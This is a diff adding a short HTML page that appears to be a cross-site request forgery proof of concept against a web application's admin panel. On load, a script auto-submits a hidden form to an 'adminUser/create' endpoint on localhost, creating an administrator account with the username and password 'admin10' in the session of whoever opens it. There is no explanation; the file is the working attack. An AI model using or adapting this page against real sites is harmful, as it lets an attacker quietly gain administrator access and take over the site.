@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+	<script type="text/javascript" src="http://localhost/specialbuy/admin/view/javascript/jquery/jquery-1.7.1.min.js"></script>
+	<script src="http://malsup.github.com/jquery.form.js"></script>
+</head>
+<body>
+	<form id="csrf" action="http://localhost/website/backend/www/admin/adminUser/create/" method="post">
+		<input type="hidden" name="AdminUser[password]" value="admin10"/>
+		<input type="hidden" name="AdminUser[username]" value="admin10"/>
+		<input type="hidden" name="AdminUser[email]" value=""/>	
+		<input type="hidden" name="AdminUser[profile]" value=""/>
+		<input type="submit">
+	</form>
+
+	<script type="text/javascript">
+		$("#csrf").submit();
+	</script>
+</body>
+</html>
